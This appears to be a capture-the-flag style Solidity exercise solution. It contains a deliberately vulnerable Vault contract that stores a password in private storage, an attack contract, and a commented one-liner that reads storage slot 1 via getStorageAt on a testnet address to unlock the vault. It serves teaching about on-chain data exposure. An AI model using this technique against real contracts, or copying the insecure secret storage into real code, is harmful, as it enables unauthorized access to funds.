// SPDX-License-Identifier: MIT

// exercise code
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}


// solution used by unit test
// see https://solidity-by-example.org/hacks/accessing-private-data/
// password extracted from storage slots using ethers.js, then passed into
// attack contract to call vulnerable contract
contract VaultAttack {
   Vault vault;

  constructor(address _vault) {
    vault =  Vault(_vault);
  }

  function attack(bytes32 password) public {
    vault.unlock(password);
  }
}


// solution used to deploy live to testnet
// use web3 browser console to extract password from slot storage
// and to call contract.unlock() with password
// replace with your contract instance address
// await contract.unlock(await web3.eth.getStorageAt('0x3Cfd7a11aD417B0c9d348CF0dbf025DBa7764484', 1))
